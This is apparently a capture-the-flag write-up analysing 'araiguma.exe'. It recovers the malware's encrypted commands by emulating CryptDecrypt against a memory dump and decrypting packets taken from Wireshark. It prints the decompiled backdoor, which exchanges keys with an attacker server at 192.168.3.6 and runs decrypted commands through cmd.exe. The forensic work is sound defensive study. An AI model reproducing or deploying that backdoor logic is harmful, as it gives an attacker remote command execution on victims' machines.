# DoroboH challenge

Description: I found a suspicious process named "araiguma.exe" running on my computer.
Before removing it, I captured my network and dumped the process memory.
Could you investigate what the malware is doing?

Download: https://drive.google.com/file/d/1KeEBMik_Dks4s5ikzDwcpLvFjMjevyyQ/view

## Initial decompilation

I loaded the program into IDA Pro, and got a pretty nice decompilation:
```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  DWORD dwBytes; // [rsp+38h] [rbp-48h] BYREF
  int dwBytes_4; // [rsp+3Ch] [rbp-44h] BYREF
  struct sockaddr name; // [rsp+40h] [rbp-40h] BYREF
  struct WSAData WSAData; // [rsp+50h] [rbp-30h] BYREF
  char buf[4]; // [rsp+1F0h] [rbp+170h] BYREF
  DWORD pdwDataLen; // [rsp+1F4h] [rbp+174h] BYREF
  HCRYPTKEY hKey; // [rsp+1F8h] [rbp+178h] BYREF
  HCRYPTKEY phKey; // [rsp+200h] [rbp+180h] BYREF
  HCRYPTPROV hProv; // [rsp+208h] [rbp+188h] BYREF
  BYTE v13[4]; // [rsp+210h] [rbp+190h] BYREF
  void *v14; // [rsp+218h] [rbp+198h]
  BYTE pbData[4]; // [rsp+220h] [rbp+1A0h] BYREF
  void *v16; // [rsp+228h] [rbp+1A8h]
  LPCSTR lpParameters; // [rsp+238h] [rbp+1B8h]
  BYTE *v18; // [rsp+240h] [rbp+1C0h]
  SOCKET s; // [rsp+248h] [rbp+1C8h]
  BYTE *v20; // [rsp+250h] [rbp+1D0h]
  HANDLE hHeap; // [rsp+258h] [rbp+1D8h]

  _main();
  *(_DWORD *)pbData = 64;
  v16 = &g_P;
  *(_DWORD *)v13 = 64;
  v14 = &g_G;
  hHeap = GetProcessHeap();
  if ( !hHeap )
    return 1;
  if ( !(unsigned int)_IAT_start__(
                        &hProv,
                        0i64,
                        "Microsoft Enhanced DSS and Diffie-Hellman Cryptographic Provider",
                        13i64,
                        -268435456) )
    return 1;
  if ( CryptGenKey(hProv, 0xAA02u, 0x2000041u, &phKey)
    && CryptSetKeyParam(phKey, 0xBu, pbData, 0)
    && CryptSetKeyParam(phKey, 0xCu, v13, 0)
    && CryptSetKeyParam(phKey, 0xEu, 0i64, 0) )
  {
    if ( CryptExportKey(phKey, 0i64, 6u, 0, 0i64, &pdwDataLen) )
    {
      v20 = (BYTE *)HeapAlloc(hHeap, 0, pdwDataLen);
      if ( v20 )
      {
        if ( CryptExportKey(phKey, 0i64, 6u, 0, v20, &pdwDataLen) )
        {
          WSAStartup(2u, &WSAData);
          s = socket(2, 1, 0);
          name.sa_family = 2;
          *(_WORD *)name.sa_data = htons(0x1F90u);
          inet_pton(2, "192.168.3.6", &name.sa_data[2]);
          if ( !connect(s, &name, 16) )
          {
            send(s, (const char *)&pdwDataLen, 4, 0);
            send(s, (const char *)v20, pdwDataLen, 0);
            recv(s, buf, 4, 0);
            v18 = (BYTE *)HeapAlloc(hHeap, 0, *(unsigned int *)buf);
            if ( v18 )
            {
              recv(s, (char *)v18, *(int *)buf, 0);
              if ( CryptImportKey(hProv, v18, *(DWORD *)buf, phKey, 0, &hKey) )
              {
                dwBytes_4 = 26625;
                if ( CryptSetKeyParam(hKey, 7u, (const BYTE *)&dwBytes_4, 0) )
                {
                  memset(v18, 0, *(unsigned int *)buf);
                  while ( recv(s, (char *)&dwBytes, 4, 0) == 4 )
                  {
                    lpParameters = (LPCSTR)HeapAlloc(hHeap, 0, dwBytes);
                    if ( !lpParameters )
                      break;
                    recv(s, (char *)lpParameters, dwBytes, 0);
                    if ( !CryptDecrypt(hKey, 0i64, 1, 0, (BYTE *)lpParameters, &dwBytes) )
                    {
                      HeapFree(hHeap, 0, (LPVOID)lpParameters);
                      break;
                    }
                    ShellExecuteA(0i64, "open", "cmd.exe", lpParameters, 0i64, 0);
                    memset((void *)lpParameters, 0, dwBytes);
                    HeapFree(hHeap, 0, (LPVOID)lpParameters);
                  }
                }
              }
              HeapFree(hHeap, 0, v18);
            }
            closesocket(s);
          }
          WSACleanup();
        }
        HeapFree(hHeap, 0, v20);
      }
    }
    CryptDestroyKey(phKey);
  }
  CryptReleaseContext(hProv, 0);
  return 0;
}
```

I also did a quick look at the other functions and initializers to make sure there wasn't any hidden code, but nothing caught my attention.

The `__IAT_start__` function call is weird and is caused by symbol overlap, it is actually a call to `CryptAcquireContextA`.

This program does some kind of key exchange with the attacker's server (located in LAN, so even if you ran this program nothing terrible should have happened), then receives messages from the attacker, each prefixed with a 4 byte length, decrypts them and executes cmd.exe with the content. The difficulty is presumably decrypting the received messages. The key exchange also uses messages prefixed with 4 byte lengths (one message from the client followed by a reply from the server). The IP of the attacker server is `192.168.3.6`.

My first idea was to maybe extract the key data from memory, but a quick look at the decompilation for `CryptDecrypt` and the Wine source code revealed that this would be rather difficult due to multiple levels of pointer indirection. It was indeed quite difficult, as the author of the task confirmed after the CTF it'd require reverse engineering quite a large part of the crypt provider's internals.

I instead remembered that I have seen a tool that can be used to emulate a minidump, so I decided to try to find it. The tool can be found at https://github.com/mrexodia/dumpulator. The idea is to call the `CryptDecrypt` function in the dump with the packet contents, with the key already present in the dump's memory.

## Dump analysis

We need to find the neccessary function offsets and the address of the `hKey` variable in the dump.

I loaded the dump into IDA Pro, used "Jump to address" to navigate to `0x401550`, defined a function there, and then navigated to the first call site in the araiguma binary from the Stack trace view (which can be opened using Debugger -> Debugger windows). While the imported functions are still unnamed, and this probably could be fixed somehow, it was not a big problem for me as I had the import names in the IDA with the actual binary.

We can see that we are waiting on the innermost `recv` call, after the key exchange has been completed. This means we need to get the `hKey` pointer. Unfortunately, IDA seems not to be able to unroll the stack automatically, or at least I don't know how to make it do that, so double clicking the pointer in the decompiler view does not give the correct address. I instead manually unrolled the stack pointer (all the functions on the stack had bp-frames so the saved rbp pointer was always before the return value for all the relevant functions) and found the key's pointer to be `0xF62E0`. Finding the address of `CryptDecrypt` can be done by just copying the function address from IDA Pro (and it is `0x7FFA9E0BF410`).

## Packet analysis

The pcap can be opened in Wireshark. We use the filter: `ip.addr == 192.168.3.6`, which is the IP of the attacker's server. We can see a single TCP stream, which we can merge using: Analyze -> Follow -> TCP stream. Then I switched the data view mode to Hex Dump.

We know that there will be one client -> server message starting the key exchange and one server -> client message completing the exchange. All server -> client commands afterwards are command invocations. We can copy them into a Python script (I used the C array view option for this) for later decryption.

## The script

Now we can write a Python script using the dumpulator library. The API is rather simple, however it apparently does not support calling functions with more than 4 parameters. However, we can still push values onto the stack, so we can push the extra values onto the stack before calling `CryptDecrypt`. An important fact is that the Microsoft ABI specified that there is a 0x20 shadow space before the arguments begin, so I filled that space with zeros. Otherwise, this script was quite straightforward. There are two packets we extracted from the packet log, the first one is uncommented in the script below and contains the flag, the other one creates a non-important file on the desktop telling the user that they are compromised.

```py
from dumpulator import Dumpulator
import struct

CryptDecrypt = 0x7FFA9E0BF410
hKey = 0xF62E0

pk = bytes([0x8c, 0x28, 0xc2, 0x0d, 0x02, 0x7a, 0xa8, 0xbc, 0x9a, 0x71, 0xb1, 0x07, 0x02, 0x24, 0x21, 0xe9, 0x07, 0x34, 0x0d, 0xe0, 0xf9, 0xa4, 0xc5, 0x40, 0x61, 0x1f, 0x2d, 0x95, 0xb5, 0x60, 0xf8, 0x43, 0x5f, 0xdb, 0x44, 0xec, 0xb3, 0x88, 0x76, 0xdd, 0xab, 0x1f, 0xe3, 0xff, 0xca, 0xf2, 0x6a, 0xeb, 0x65, 0xb7, 0xf7, 0xf4, 0xd1, 0xd0, 0xbc, 0x6c, 0xee, 0xc5, 0x21, 0xc7, 0x7c, 0x27, 0xcd, 0x0f, 0xfb, 0xa4, 0xa9, 0xd0, 0x07, 0x22, 0x8c, 0x47, 0x82, 0x88, 0xb9, 0x06, 0xb6, 0x4d, 0x83, 0x2b, 0xe9, 0x82, 0x2e, 0x12, 0x3e, 0xc4, 0xa5, 0xab, 0xbc, 0x15, 0x5a, 0x24, 0xb6, 0x3a, 0x8c, 0x65, 0x7c, 0x05, 0xff, 0x61, 0x48, 0x12, 0x4f])
#pk = bytes([0x8c, 0x28, 0xc2, 0x0d, 0x02, 0x7a, 0xa8, 0xbc, 0x9a, 0x6b, 0xd4, 0x36, 0x24, 0x0c, 0x1d, 0xf7, 0x3e, 0x27, 0x14, 0xbf, 0xab, 0xae, 0xfb, 0x7d, 0x34, 0x06, 0x35, 0xdf, 0x91, 0x74, 0xe2, 0x47, 0x19, 0xdd, 0x3b, 0xcc, 0xe8, 0x95, 0x72, 0xdd, 0xad, 0x49, 0xac, 0x8c, 0x93, 0xf1, 0x22, 0xaa, 0x61, 0xad, 0xa3, 0xf3, 0xcb, 0x8a, 0xa1, 0x28, 0x8b, 0xab, 0x33, 0x95, 0x71, 0x69, 0xfd, 0x04, 0xc4, 0x82, 0xa7, 0x97, 0x55, 0x6f, 0xf0, 0x67, 0xcc, 0xb2, 0xb0, 0x31, 0xb6, 0x4c, 0x9b, 0x03, 0xe5, 0x86, 0x14, 0x20, 0x15, 0xd5, 0xbf, 0xa6, 0xa1, 0x19, 0x4b, 0x0c, 0xb9, 0x39, 0x83, 0x2c, 0x26, 0x09, 0xf3, 0x18, 0x4f, 0x18])

dp = Dumpulator("araiguma.DMP")

buf_addr = dp.allocate(256+4)
dp.write(buf_addr, pk) # packet data
dp.write(buf_addr+256, struct.pack('<I', len(pk))) # length

dp.push(buf_addr+256) # pointer to length
dp.push(buf_addr) # pointer to data
dp.push(0) # padding required due to Windows ABI
dp.push(0)
dp.push(0)
dp.push(0)
dp.call(CryptDecrypt, [hKey, 0, 1, 0])
decrypted = dp.read(buf_addr, len(pk))
print(decrypted)
```


